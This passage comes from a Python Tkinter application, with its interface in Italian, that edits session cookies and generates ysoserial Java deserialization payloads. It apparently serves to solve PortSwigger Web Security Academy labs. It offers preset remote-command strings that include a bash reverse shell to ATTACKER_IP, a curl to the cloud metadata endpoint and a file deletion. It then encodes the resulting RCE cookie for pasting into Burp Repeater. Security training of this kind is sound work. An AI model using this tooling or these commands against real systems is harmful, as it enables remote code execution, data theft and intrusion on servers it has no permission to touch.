                   style="Danger.TButton").pack(side="left", padx=4)
        tk.Label(jwt_f, text="Quick payload helpers per JWT labs",
                 bg=c["bg"], fg="#8b949e", font=("Consolas",9)).pack(anchor="w", pady=(4,0))

        # Request tester
        req_f = tk.LabelFrame(f, text=" 🚀 Test Request ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=8, padx=10, bd=1, relief="solid")
        req_f.pack(fill="x", padx=12, pady=4)
        row_url = tk.Frame(req_f, bg=c["bg"])
        row_url.pack(fill="x")
        tk.Label(row_url, text="URL:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10), width=6).pack(side="left")
        self.test_url_var = tk.StringVar(value="https://YOUR-LAB.web-security-academy.net/")
        tk.Entry(row_url, textvariable=self.test_url_var, bg=c["bg"], fg=c["fg"],
                 insertbackground=c["fg"], font=("Consolas",10), relief="flat",
                 highlightbackground=c["border"], highlightthickness=1).pack(side="left", fill="x", expand=True, ipady=4, padx=4)
        ttk.Button(req_f, text="📡 Invia Test Request", command=self.do_test_request).pack(pady=(6,0))

        self.test_result = scrolledtext.ScrolledText(
            f, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
            font=("Consolas",9), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1, height=6
        )
        self.test_result.pack(fill="both", expand=True, padx=12, pady=8)

    # ── TAB 4: PROXY ─────────────────────────────────────────────────────────

    def _build_tab_proxy(self):
        f = self._make_tab("🌐 Proxy / Burp")
        c = self._colors

        tk.Label(f, text="Configurazione Proxy (Burp Suite / ZAP):",
                 bg=c["bg"], fg=c["acc"], font=("Consolas",11,"bold")).pack(anchor="w", padx=12, pady=(12,4))

        cfg_f = tk.LabelFrame(f, text=" Proxy Settings ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=8, padx=10, bd=1, relief="solid")
        cfg_f.pack(fill="x", padx=12, pady=4)

        for label, default in [("Host:", "127.0.0.1"), ("Porta:", "8080")]:
            row = tk.Frame(cfg_f, bg=c["bg"])
            row.pack(fill="x", pady=2)
            tk.Label(row, text=label, bg=c["bg"], fg=c["fg"],
                     font=("Consolas",10), width=8).pack(side="left")
            var = tk.StringVar(value=default)
            if label == "Host:":
                self.proxy_host_var = var
            else:
                self.proxy_port_var = var
            tk.Entry(row, textvariable=var, bg=c["bg"], fg=c["fg"],
                     insertbackground=c["fg"], font=("Consolas",10), relief="flat",
                     highlightbackground=c["border"], highlightthickness=1).pack(side="left", ipady=4, padx=4)

        ttk.Button(cfg_f, text="📡 Forward Cookie a Proxy",
                   command=self._forward_to_proxy).pack(pady=(8,0))

        info = tk.Label(f, text=(
            "ℹ Come usare:\n"
            "1. Avvia Burp Suite su 127.0.0.1:8080 (o ZAP)\n"
            "2. Configura il tuo browser per usare il proxy\n"
            "3. Usa 'Forward Cookie a Proxy' per inviare il cookie tamperato\n"
            "4. Intercetta la request in Burp e modifica a piacimento\n\n"
            "💡 Web UI disponibile su http://127.0.0.1:8990 per uso da browser"
        ), bg=c["bg"], fg="#8b949e", font=("Consolas",10), justify="left")
        info.pack(anchor="w", padx=12, pady=12)

        self.proxy_log = scrolledtext.ScrolledText(
            f, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
            font=("Consolas",9), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1, height=8
        )
        self.proxy_log.pack(fill="both", expand=True, padx=12, pady=8)

    # ── TAB 5: GADGETS ────────────────────────────────────────────────────────

    def _build_tab_gadgets(self):
        f = self._make_tab("💣 Gadgets")
        c = self._colors

        tk.Label(f, text="Gadget Chains per Deserialization Labs",
                 bg=c["bg"], fg=c["acc"], font=("Consolas",12,"bold")).pack(anchor="w", padx=12, pady=(12,4))
        tk.Label(f, text="⚠ Solo a scopo educativo - Nessun comando reale viene eseguito",
                 bg=c["bg"], fg="#f85149", font=("Consolas",9)).pack(anchor="w", padx=12, pady=(0,8))

        canvas = tk.Canvas(f, bg=c["bg"], highlightthickness=0)
        scroll = ttk.Scrollbar(f, orient="vertical", command=canvas.yview)
        self.gadget_frame = tk.Frame(canvas, bg=c["bg"])
        self.gadget_frame.bind("<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=self.gadget_frame, anchor="nw")
        canvas.configure(yscrollcommand=scroll.set)
        canvas.pack(side="left", fill="both", expand=True, padx=12, pady=8)
        scroll.pack(side="right", fill="y", pady=8)

        self._populate_gadgets()

    def _populate_gadgets(self):
        c = self._colors
        for lang, gadgets in GADGET_SUGGESTIONS.items():
            lbl = tk.Label(self.gadget_frame, text=f"── {lang} ──",
                           bg=c["bg"], fg=c["acc"], font=("Consolas",11,"bold"))
            lbl.pack(anchor="w", pady=(12,4), padx=4)
            for g in gadgets:
                gf = tk.Frame(self.gadget_frame, bg=c["panel"], bd=0)
                gf.pack(fill="x", pady=2, padx=4)
                tk.Label(gf, text=g["name"], bg=c["panel"], fg=c["fg"],
                         font=("Consolas",10,"bold")).pack(anchor="w", padx=8, pady=(6,2))
                tk.Label(gf, text=g["desc"], bg=c["panel"], fg="#8b949e",
                         font=("Consolas",9), wraplength=600, justify="left").pack(anchor="w", padx=8)
                btn_r = tk.Frame(gf, bg=c["panel"])
                btn_r.pack(anchor="w", padx=8, pady=(4,6))
                if g.get("payload"):
                    ttk.Button(btn_r, text="📥 Carica Payload",
                               command=lambda p=g["payload"]: self._load_gadget_payload(p),
                               style="Danger.TButton").pack(side="left", padx=4)
                ttk.Button(btn_r, text="📋 Info",
                           command=lambda n=g["name"],d=g["desc"]: messagebox.showinfo(f"Gadget: {n}", d),
                           style="Muted.TButton").pack(side="left", padx=4)

    # ── TAB 6: LOG ────────────────────────────────────────────────────────────

    def _build_tab_ysoserial(self):
        f = self._make_tab("💣 ysoserial")
        c = self._colors

        # ── Header warning ───────────────────────────────────────────────────
        warn = tk.Frame(f, bg="#2d1117", pady=6, padx=12)
        warn.pack(fill="x")
        tk.Label(warn, text="⚠  Solo per PortSwigger Web Security Academy Labs · Ambiente controllato",
                 bg="#2d1117", fg="#f85149", font=("Consolas",9,"bold")).pack(side="left")

        # ── Java status ───────────────────────────────────────────────────────
        java_f = tk.LabelFrame(f, text=" ☕ Java Runtime ",
                                bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                                pady=6, padx=12, bd=1, relief="solid")
        java_f.pack(fill="x", padx=12, pady=(8,4))
        java_row = tk.Frame(java_f, bg=c["bg"])
        java_row.pack(fill="x")
        self.java_status_lbl = tk.Label(java_row, text="⏳ Verifica...",
                                         bg=c["bg"], fg="#8b949e", font=("Consolas",10))
        self.java_status_lbl.pack(side="left")
        ttk.Button(java_row, text="🔄 Verifica Java", command=self._check_java,
                   style="Muted.TButton").pack(side="right")

        # ── JAR path ──────────────────────────────────────────────────────────
        jar_f = tk.LabelFrame(f, text=" 📦 ysoserial JAR ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=6, padx=12, bd=1, relief="solid")
        jar_f.pack(fill="x", padx=12, pady=4)
        jar_row = tk.Frame(jar_f, bg=c["bg"])
        jar_row.pack(fill="x")
        tk.Label(jar_row, text="JAR:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10), width=5).pack(side="left")
        self.jar_path_var = tk.StringVar(value="ysoserial-all.jar")
        tk.Entry(jar_row, textvariable=self.jar_path_var, bg=c["bg"], fg=c["fg"],
                 insertbackground=c["fg"], font=("Consolas",10), relief="flat",
                 highlightbackground=c["border"], highlightthickness=1).pack(
                     side="left", fill="x", expand=True, ipady=4, padx=4)
        ttk.Button(jar_row, text="📂 Sfoglia", command=self._browse_jar,
                   style="Muted.TButton").pack(side="right")

        # Download helper
        dl_row = tk.Frame(jar_f, bg=c["bg"])
        dl_row.pack(fill="x", pady=(4,0))
        tk.Label(dl_row,
                 text="Scarica da: https://github.com/frohoff/ysoserial/releases",
                 bg=c["bg"], fg="#8b949e", font=("Consolas",9)).pack(side="left")
        ttk.Button(dl_row, text="📥 Download auto", command=self._download_ysoserial,
                   style="Muted.TButton").pack(side="right")

        # ── Payload config ────────────────────────────────────────────────────
        cfg_f = tk.LabelFrame(f, text=" ⚙ Configurazione Payload ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=8, padx=12, bd=1, relief="solid")
        cfg_f.pack(fill="x", padx=12, pady=4)

        # Gadget chain dropdown
        chain_row = tk.Frame(cfg_f, bg=c["bg"])
        chain_row.pack(fill="x", pady=2)
        tk.Label(chain_row, text="Gadget Chain:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10), width=16).pack(side="left")
        CHAINS = [
            "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
            "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
            "CommonsCollections7", "BeanShell1", "Clojure", "CommonsBeanutils1",
            "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1",
            "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1",
            "Jdk7u21", "Jdk8u20", "MozillaRhino1", "MozillaRhino2",
            "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2",
            "URLDNS", "Vaadin1", "Wicket1",
        ]
        self.chain_var = tk.StringVar(value="CommonsCollections4")
        chain_menu = ttk.Combobox(chain_row, textvariable=self.chain_var,
                                   values=CHAINS, state="readonly", font=("Consolas",10))
        chain_menu.pack(side="left", padx=4, fill="x", expand=True)

        # Chain description
        self.chain_desc_lbl = tk.Label(cfg_f, text="", bg=c["bg"], fg="#8b949e",
                                        font=("Consolas",9), anchor="w", justify="left")
        self.chain_desc_lbl.pack(fill="x", pady=(2,4))
        chain_menu.bind("<<ComboboxSelected>>", self._on_chain_select)

        # Command input
        cmd_row = tk.Frame(cfg_f, bg=c["bg"])
        cmd_row.pack(fill="x", pady=2)
        tk.Label(cmd_row, text="Comando RCE:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10), width=16).pack(side="left")
        self.rce_cmd_var = tk.StringVar(value="rm /home/carlos/morale.txt")
        rce_entry = tk.Entry(cmd_row, textvariable=self.rce_cmd_var, bg=c["bg"],
                              fg="#f85149", insertbackground=c["fg"],
                              font=("Consolas",11,"bold"), relief="flat",
                              highlightbackground="#f85149", highlightthickness=1)
        rce_entry.pack(side="left", fill="x", expand=True, ipady=5, padx=4)

        # Quick command buttons
        quick_row = tk.Frame(cfg_f, bg=c["bg"])
        quick_row.pack(fill="x", pady=(4,0))
        tk.Label(quick_row, text="Quick:", bg=c["bg"], fg="#8b949e",
                 font=("Consolas",9)).pack(side="left", padx=(0,4))
        quick_cmds = [
            ("Carlos lab", "rm /home/carlos/morale.txt"),
            ("whoami→/tmp", "id > /tmp/pwned.txt"),
            ("Reverse shell", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
            ("curl SSRF", "curl http://169.254.169.254/latest/meta-data/"),
        ]
        for label, cmd in quick_cmds:
            ttk.Button(quick_row, text=label,
                       command=lambda c=cmd: self.rce_cmd_var.set(c),
                       style="Muted.TButton").pack(side="left", padx=2)

        # Java version selector
        jver_row = tk.Frame(cfg_f, bg=c["bg"])
        jver_row.pack(fill="x", pady=(6,0))
        tk.Label(jver_row, text="Java version:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10), width=16).pack(side="left")
        self.java_ver_var = tk.StringVar(value="16+")
        ttk.Radiobutton(jver_row, text="Java ≤ 15", variable=self.java_ver_var,
                         value="15").pack(side="left", padx=4)
        ttk.Radiobutton(jver_row, text="Java ≥ 16 (default)", variable=self.java_ver_var,
                         value="16+").pack(side="left", padx=4)
        self.java_ver_actual_lbl = tk.Label(jver_row, text="", bg=c["bg"], fg="#8b949e",
                                             font=("Consolas",9))
        self.java_ver_actual_lbl.pack(side="left", padx=8)

        # ── Output ───────────────────────────────────────────────────────────
        out_f = tk.LabelFrame(f, text=" 📤 Output — Cookie Pronto ",
                               bg=c["bg"], fg=c["acc"], font=("Consolas",10,"bold"),
                               pady=6, padx=12, bd=1, relief="solid")
        out_f.pack(fill="both", expand=True, padx=12, pady=4)

        # Encoding choice
        enc_row = tk.Frame(out_f, bg=c["bg"])
        enc_row.pack(fill="x", pady=(0,4))
        tk.Label(enc_row, text="Output encoding:", bg=c["bg"], fg=c["fg"],
                 font=("Consolas",10)).pack(side="left")
        self.enc_var = tk.StringVar(value="base64+urlencode")
        for txt, val in [("Base64", "base64"), ("Base64 + URL-encode", "base64+urlencode"),
                          ("Hex", "hex")]:
            ttk.Radiobutton(enc_row, text=txt, variable=self.enc_var, value=val).pack(
                side="left", padx=6)

        self.yso_output = scrolledtext.ScrolledText(
            out_f, bg=c["bg"], fg="#3fb950", insertbackground=c["fg"],
            font=("Consolas",10), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1, height=5
        )
        self.yso_output.pack(fill="both", expand=True, pady=4)

        # Generated command preview
        tk.Label(out_f, text="Comando eseguito:", bg=c["bg"], fg="#8b949e",
                 font=("Consolas",9)).pack(anchor="w")
        self.yso_cmd_preview = tk.Label(out_f, text="", bg="#0d1117", fg="#8b949e",
                                         font=("Consolas",8), anchor="w", justify="left",
                                         wraplength=700)
        self.yso_cmd_preview.pack(fill="x", pady=(2,4))

        # ── Action buttons ────────────────────────────────────────────────────
        act_row = tk.Frame(f, bg=c["bg"])
        act_row.pack(fill="x", padx=12, pady=(0,8))
        self.yso_gen_btn = ttk.Button(act_row, text="🚀  GENERA PAYLOAD",
                                       command=self.do_generate_ysoserial)
        self.yso_gen_btn.pack(side="left", padx=4)
        ttk.Button(act_row, text="📋 Copia Cookie",
                   command=self._copy_yso_output,
                   style="Success.TButton").pack(side="left", padx=4)
        ttk.Button(act_row, text="→ Invia a Generate Tab",
                   command=self._send_yso_to_generate,
                   style="Muted.TButton").pack(side="left", padx=4)
        self.yso_status = tk.Label(act_row, text="", bg=c["bg"], fg="#3fb950",
                                    font=("Consolas",10,"bold"))
        self.yso_status.pack(side="left", padx=12)

        # Auto-check Java on tab init
        self.root.after(800, self._check_java)
        # Set initial chain desc
        self.root.after(100, lambda: self._on_chain_select(None))

    def _build_tab_log(self):
        f = self._make_tab("📜 Log")
        c = self._colors

        self.log_text = scrolledtext.ScrolledText(
            f, bg=c["bg"], fg=c["fg"], insertbackground=c["fg"],
            font=("Consolas",9), wrap="word", relief="flat", bd=0,
            highlightbackground=c["border"], highlightthickness=1
        )
        self.log_text.pack(fill="both", expand=True, padx=12, pady=8)

        btn_r = tk.Frame(f, bg=c["bg"])
        btn_r.pack(fill="x", padx=12, pady=(0,8))
        ttk.Button(btn_r, text="🔄 Refresh", command=self._refresh_log).pack(side="left", padx=4)
        ttk.Button(btn_r, text="🗑 Pulisci Log", command=self._clear_log,
                   style="Danger.TButton").pack(side="left", padx=4)
        ttk.Button(btn_r, text="💾 Salva Log", command=self._save_log,
                   style="Muted.TButton").pack(side="left", padx=4)

    # ── ACTIONS ───────────────────────────────────────────────────────────────

    # ── YSOSERIAL ENGINE ──────────────────────────────────────────────────────

    CHAIN_DESCRIPTIONS = {
        "CommonsCollections1": "Apache Commons Collections 1.x (Java ≤8) — LazyMap gadget chain",
        "CommonsCollections2": "Apache Commons Collections 4.0 — PriorityQueue + InvokerTransformer",
        "CommonsCollections3": "Commons Collections 1.x — InstantiateTransformer variant",
        "CommonsCollections4": "Commons Collections 4.0 — PriorityQueue + InstantiateTransformer (raccomandato per lab)",
        "CommonsCollections5": "Commons Collections 3.1 — BadAttributeValueExpException",
        "CommonsCollections6": "Commons Collections 3.1/4.0 — HashSet (Java 8 no-sec-mgr)",
        "CommonsCollections7": "Commons Collections 3.1 — Hashtable gadget",
        "BeanShell1":          "BeanShell scripting engine (se presente nel classpath)",
        "Clojure":             "Clojure runtime gadget chain",
        "CommonsBeanutils1":   "Commons BeanUtils 1.9.x — PropertyUtils gadget",
        "Groovy1":             "Groovy 2.3.x — MethodClosure gadget",
        "Hibernate1":          "Hibernate 5.x gadget chain",
        "Hibernate2":          "Hibernate 4.x alternate gadget",
        "JBossInterceptors1":  "JBoss Interceptors gadget (JBoss/WildFly)",
        "JRMPClient":          "JRMP client — triggera callback su listener remoto",
        "JRMPListener":        "JRMP listener — ascolta su porta specificata",
        "JSON1":               "JSON-lib — JsonConfig gadget chain",
        "JavassistWeld1":      "Javassist + CDI Weld gadget",
        "Jdk7u21":             "JDK 7u21 gadget — funziona senza lib esterne",
        "Jdk8u20":             "JDK 8u20 gadget — LinkedHashSet + proxy",
        "MozillaRhino1":       "Mozilla Rhino JS engine gadget",
        "MozillaRhino2":       "Mozilla Rhino alternate chain",
        "Myfaces1":            "Apache MyFaces JSF gadget",
        "Myfaces2":            "Apache MyFaces 2.x alternate",
        "ROME":                "ROME RSS/Atom parser — ObjectBean gadget",
        "Spring1":             "Spring Framework 4.x — MethodInvokeTypeProvider",
        "Spring2":             "Spring Framework — Alternative gadget",
        "URLDNS":              "DNS lookup (solo detection, no RCE) — utile per SSRF/blind",
        "Vaadin1":             "Vaadin 7.x gadget chain",
        "Wicket1":             "Apache Wicket 1.x gadget",
    }

    def _on_chain_select(self, event):
        """Aggiorna descrizione quando si cambia gadget chain."""
        chain = self.chain_var.get()
        desc = self.CHAIN_DESCRIPTIONS.get(chain, "")
        self.chain_desc_lbl.config(text=f"  ℹ {desc}" if desc else "")

    def _check_java(self):
        """Verifica Java installato e versione."""
        import subprocess
        try:
            result = subprocess.run(
                ["java", "-version"],
                capture_output=True, text=True, timeout=5
            )
            out = (result.stderr + result.stdout).strip()
            # Estrai versione
            m = re.search(r'version "([^"]+)"', out)
            if m:
                ver_str = m.group(1)
                ver_major = int(ver_str.split(".")[0]) if ver_str.split(".")[0].isdigit() else 0
                if ver_major == 1:
                    ver_major = int(ver_str.split(".")[1]) if len(ver_str.split(".")) > 1 else 8
                self.java_status_lbl.config(
                    text=f"✅ Java {ver_str} trovato (major: {ver_major})",
                    fg="#3fb950"
                )
                # Auto-set radio button
                if ver_major >= 16:
                    self.java_ver_var.set("16+")
                    self.java_ver_actual_lbl.config(text=f"(rilevato: Java {ver_major} → uso flag --add-opens)")
                else:
                    self.java_ver_var.set("15")
                    self.java_ver_actual_lbl.config(text=f"(rilevato: Java {ver_major} → sintassi semplice)")
                log_event(f"☕ Java {ver_str} rilevato")
            else:
                self.java_status_lbl.config(text="⚠ Java trovato ma versione non parsata", fg="#f0883e")
        except FileNotFoundError:
            self.java_status_lbl.config(
                text="❌ Java non trovato nel PATH. Installa JDK e riprova.", fg="#f85149"
            )
            log_event("❌ Java non trovato nel PATH")
        except Exception as e:
            self.java_status_lbl.config(text=f"❌ Errore verifica Java: {e}", fg="#f85149")

    def _browse_jar(self):
        path = filedialog.askopenfilename(
            title="Seleziona ysoserial JAR",
            filetypes=[("JAR files","*.jar"),("All","*.*")]
        )
        if path:
            self.jar_path_var.set(path)
            log_event(f"📦 JAR selezionato: {path}")

    def _download_ysoserial(self):
        """Scarica ysoserial-all.jar da GitHub releases."""
        import urllib.request
        URL = "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"
        dest = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ysoserial-all.jar")

        if os.path.exists(dest):
            if not messagebox.askyesno("File esiste",
                f"ysoserial-all.jar già presente in:\n{dest}\n\nRiscaricarlo?"):
                self.jar_path_var.set(dest)
                return

        if not messagebox.askyesno("📥 Download ysoserial",
            f"Scarico ysoserial-all.jar da GitHub releases in:\n{dest}\n\nContinuare?"):
            return

        self.yso_status.config(text="⏳ Download in corso...", fg="#f0883e")
        self.root.update()

        def _do_download():
            try:
                log_event(f"📥 Download ysoserial da {URL}")
                urllib.request.urlretrieve(URL, dest)
                size_mb = os.path.getsize(dest) / 1024 / 1024
                self.root.after(0, lambda: self.jar_path_var.set(dest))
                self.root.after(0, lambda: self.yso_status.config(
                    text=f"✅ Scaricato ({size_mb:.1f} MB)", fg="#3fb950"))
                self.root.after(0, lambda: messagebox.showinfo(
                    "✅ Download completato",
                    f"ysoserial-all.jar scaricato ({size_mb:.1f} MB):\n{dest}"))
                log_event(f"✅ ysoserial scaricato: {dest} ({size_mb:.1f} MB)")
            except Exception as e:
                self.root.after(0, lambda: self.yso_status.config(
                    text=f"❌ Download fallito", fg="#f85149"))
                self.root.after(0, lambda: messagebox.showerror(
                    "❌ Download Fallito",
                    f"Impossibile scaricare ysoserial:\n{e}\n\n"
                    f"Scarica manualmente da:\nhttps://github.com/frohoff/ysoserial/releases"))
                log_event(f"❌ Download fallito: {e}")

        threading.Thread(target=_do_download, daemon=True).start()

    def _build_ysoserial_cmd(self) -> list:
        """Costruisce la lista di argomenti per subprocess."""
        jar  = self.jar_path_var.get().strip()
        chain = self.chain_var.get().strip()
        cmd   = self.rce_cmd_var.get().strip()
        jver  = self.java_ver_var.get()

        if jver == "16+":
            args = [
                "java",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens=java.base/java.net=ALL-UNNAMED",
                "--add-opens=java.base/java.util=ALL-UNNAMED",
                "-jar", jar,
                chain, cmd,
            ]
        else:
            args = ["java", "-jar", jar, chain, cmd]

        return args

    def do_generate_ysoserial(self):
        """Genera il payload ysoserial in un thread separato."""
        import subprocess

        jar   = self.jar_path_var.get().strip()
        chain = self.chain_var.get().strip()
        cmd   = self.rce_cmd_var.get().strip()

        # Validazioni
        if not jar:
            messagebox.showwarning("⚠ JAR mancante",
                "Specifica il percorso di ysoserial-all.jar.")
            return
        if not os.path.isfile(jar):
            messagebox.showerror("❌ JAR non trovato",
                f"File non trovato:\n{jar}\n\nScaricalo con il bottone 'Download auto'.")
            return
        if not chain:
            messagebox.showwarning("⚠ Gadget chain mancante",
                "Seleziona una gadget chain dal menu.")
            return
        if not cmd:
            messagebox.showwarning("⚠ Comando mancante",
                "Inserisci il comando da eseguire (es. rm /home/carlos/morale.txt).")
            return

        # Conferma esecuzione
        confirm_msg = (
            f"🚀 Generazione payload ysoserial\n\n"
            f"Gadget chain: {chain}\n"
            f"Comando:      {cmd}\n"
            f"JAR:          {os.path.basename(jar)}\n"
            f"Java:         {self.java_ver_var.get()}\n\n"
            f"Il payload verrà generato localmente e base64-encodato.\n"
            f"Nessun comando viene eseguito sul server finché non invii il cookie al lab.\n\n"
            f"Continuare?"
        )
        if not messagebox.askyesno("Conferma generazione", confirm_msg):
            return

        args = self._build_ysoserial_cmd()
        cmd_preview = " ".join(f'"{a}"' if " " in a else a for a in args)
        self.yso_cmd_preview.config(text=cmd_preview)

        self.yso_gen_btn.config(state="disabled")
        self.yso_status.config(text="⏳ Generazione in corso...", fg="#f0883e")
        self.yso_output.delete("1.0", "end")
        self.root.update()

        log_event(f"🚀 ysoserial: {chain} → {cmd!r}")

        def _run():
            import subprocess
            try:
                result = subprocess.run(
                    args,
                    capture_output=True,
                    timeout=30
                )

                raw_bytes = result.stdout
                stderr_out = result.stderr.decode("utf-8", errors="replace").strip()

                if not raw_bytes:
                    err_msg = stderr_out or "Output vuoto. Verifica JAR e gadget chain."
                    self.root.after(0, lambda: self._yso_error(
                        f"ysoserial non ha prodotto output.\n\n{err_msg}"))
                    return

                # Verifica magic bytes Java serial
                if not (raw_bytes[:2] == b'\xac\xed'):
                    # Potrebbe essere un errore testuale
                    err_text = raw_bytes.decode("utf-8", errors="replace")
                    if "Exception" in err_text or "Error" in err_text:
                        self.root.after(0, lambda: self._yso_error(
                            f"ysoserial errore:\n{err_text[:800]}"))
                        return

                # Encoding scelto
                enc = self.enc_var.get()
                if enc == "base64":
                    output = base64.b64encode(raw_bytes).decode()
                elif enc == "base64+urlencode":
                    b64 = base64.b64encode(raw_bytes).decode()
                    output = urllib.parse.quote(b64, safe="")
                elif enc == "hex":
                    output = raw_bytes.hex().upper()
                else:
                    output = base64.b64encode(raw_bytes).decode()

                # Cookie name from current session
                current = CURRENT_STATE.get("raw_cookie", "")
                cookie_name = ""
                if "=" in current:
                    cookie_name = current.split("=", 1)[0] + "="

                final_cookie = cookie_name + output if cookie_name else output

                size_bytes = len(raw_bytes)
                summary = (
                    f"✅ Payload generato!\n"
                    f"Chain: {chain} | Size: {size_bytes} bytes | Encoding: {enc}\n"
                    f"{'─'*60}\n"
                    f"{final_cookie}"
                )

                if stderr_out:
                    log_event(f"ℹ ysoserial stderr: {stderr_out[:200]}")

                CURRENT_STATE["new_cookie"] = final_cookie
                log_event(f"✅ Payload {chain} generato: {size_bytes} bytes → {enc}")

                self.root.after(0, lambda: self._yso_success(summary, final_cookie, size_bytes))

            except FileNotFoundError:
                self.root.after(0, lambda: self._yso_error(
                    "Java non trovato nel PATH.\n\nInstalla JDK 8+ e assicurati che 'java' sia nel PATH."))
            except subprocess.TimeoutExpired:
                self.root.after(0, lambda: self._yso_error(
                    "Timeout (30s) — ysoserial non ha risposto.\nVerifica il JAR e la gadget chain."))
            except Exception as e:
                self.root.after(0, lambda: self._yso_error(f"Errore inaspettato:\n{e}"))

        threading.Thread(target=_run, daemon=True).start()

    def _yso_success(self, summary: str, cookie: str, size: int):
        self.yso_gen_btn.config(state="normal")
        self.yso_status.config(text=f"✅ {size} bytes generati!", fg="#3fb950")
        self.yso_output.delete("1.0", "end")
        self.yso_output.insert("1.0", summary)
        self._refresh_log()
        messagebox.showinfo(
            "✅ Payload Generato!",
            f"Payload ysoserial creato con successo!\n\n"
            f"Dimensione: {size} bytes\n"
            f"Encoding: {self.enc_var.get()}\n\n"
            f"Il cookie è pronto — usa 'Copia Cookie' e incollalo in Burp Repeater\n"
            f"come valore del cookie di sessione (sostituisci tutto il valore)."
        )

    def _yso_error(self, msg: str):
        self.yso_gen_btn.config(state="normal")
        self.yso_status.config(text="❌ Errore", fg="#f85149")
        log_event(f"❌ ysoserial error: {msg[:100]}")
        messagebox.showerror("❌ Generazione Fallita", msg)

    def _copy_yso_output(self):
        val = self.yso_output.get("1.0", "end").strip()
        if not val:
            messagebox.showwarning("⚠", "Nessun payload generato ancora.")
            return
        # Estrai solo il cookie (ultima riga o dopo le ----)
        lines = val.splitlines()
        cookie_line = ""
        for line in reversed(lines):
            if line.strip() and not line.startswith("✅") and not line.startswith("Chain") and "─" not in line:
                cookie_line = line.strip()
                break
        if not cookie_line:
            cookie_line = val
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(cookie_line)
            messagebox.showinfo("✅ Copiato!", 
                "Cookie copiato negli appunti!\n\n"
                "Vai in Burp Repeater → sostituisci il valore del cookie di sessione → Send.")
        except Exception as e:
            messagebox.showerror("❌", f"Errore copia: {e}")

    def _send_yso_to_generate(self):
        """Manda il payload alla tab Generate per test request."""
        cookie = CURRENT_STATE.get("new_cookie", "")
        if not cookie:
            messagebox.showwarning("⚠", "Prima genera un payload con 'GENERA PAYLOAD'.")
            return
        self.gen_text.delete("1.0", "end")
        self.gen_text.insert("1.0", cookie)
        self.nb.select(2)  # Tab Generate
        log_event(f"→ Payload inviato alla tab Generate")

    def do_detect(self):
        """Analizza il cookie e aggiorna l'UI."""
        raw = self.cookie_var.get().strip()
        if not raw:
            messagebox.showwarning("⚠ Attenzione", "Inserisci un cookie di sessione nel campo in alto.")
            return

        CURRENT_STATE["raw_cookie"] = raw
        try:
            det = detect_language(raw)
        except Exception as e:
            messagebox.showerror("❌ Errore Interno", f"Errore durante la detection:\n{e}")
            log_event(f"❌ detect crash: {e}")
            return

        CURRENT_STATE["detected"] = det

        # Mostra errore se presente MA continua con preview parziale
        if det.get("error"):
            messagebox.showwarning("⚠ Avviso Detection",
                                   f"Detection completata con avviso:\n\n{det['error']}")

        lang = det.get("lang", "Unknown")
        conf = det.get("confidence", 0)
        method = det.get("method", "")
        preview = det.get("preview", "") or "(nessun preview disponibile)"

        # Aggiorna label
        self.lang_label.config(text=lang)
        self.conf_label.config(text=f"| {conf}% confidenza | {method}")
        self.detect_label.config(text=f"✓ {lang}", fg="#3fb950")

        # Tab Decode
        self.decode_text.delete("1.0", "end")
        self.decode_text.insert("1.0", preview)

        # Tab Edit - popola params
        params = extract_params_from_detection(det)
        CURRENT_STATE["params"] = params
        self._populate_param_tree(params)

        log_entry = log_event(f"🔍 Rilevato: {lang} ({conf}%) via {method}")
        self._refresh_log()

        # Popup conferma
        messagebox.showinfo(
            "✅ Cookie Rilevato",
            f"Linguaggio: {lang}\nConfidenza: {conf}%\nMetodo: {method}\n\n"
            f"Preview (prime 300 char):\n{preview[:300]}{'...' if len(preview) > 300 else ''}"
        )

    def do_reencode(self):
        """Re-encode il cookie con i parametri modificati."""
        raw = self.cookie_var.get().strip()
        if not raw:
            messagebox.showwarning("⚠ Attenzione", "Nessun cookie caricato. Inserisci e analizza prima.")
            return

        lang = CURRENT_STATE.get("detected", {}).get("lang", "Unknown")
        if lang in ("Unknown", "Binary/Unknown"):
            messagebox.showerror("❌ Re-encode non supportato",
                                 f"Impossibile re-encodare il formato '{lang}'.\n"
                                 f"Formati supportati: JWT, JSON, PHP Serialize, Key=Value.")
            return

        params = self._get_params_from_tree()
        CURRENT_STATE["params"] = params

        result = reencode_cookie(raw, params, lang)

        if not result["success"]:
            messagebox.showerror("❌ Re-encode Fallito", result["error"])
            log_event(f"❌ Re-encode fail: {result['error']}")
            return

        new_val = result["new_value"]
        CURRENT_STATE["new_cookie"] = new_val

        self.gen_text.delete("1.0", "end")
        self.gen_text.insert("1.0", new_val)
        log_event(f"✅ Re-encode OK ({lang}) → {new_val[:80]}...")
        self._refresh_log()
        self.nb.select(2)  # Vai al tab Generate
        messagebox.showinfo("✅ Re-encode Completato",
